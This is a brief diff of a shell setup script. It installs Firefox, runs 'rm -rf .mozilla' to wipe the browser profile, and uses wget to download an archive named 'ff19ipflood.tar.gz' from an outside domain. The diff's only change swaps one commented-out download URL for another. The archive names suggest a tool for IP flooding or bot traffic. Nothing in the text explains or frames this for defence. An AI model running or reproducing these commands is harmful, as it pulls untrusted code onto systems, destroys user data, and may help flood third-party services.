@@ -24,7 +24,7 @@ sleep 1
 apt-get install firefox -y
 sleep 1
 #rm -rf .moazilla
-#wget https://github.com/mazbron/x/raw/master/fmb/mzlgame.tar.gz
+#wget https://github.com/jxuat/xxx/raw/main/fmb/mzlgame.tar.gz
 #tar -xvf mzlgame.tar.gz
 rm -rf .mozilla
 wget cerdaspro.com/gulingan/ff19ipflood.tar.gz
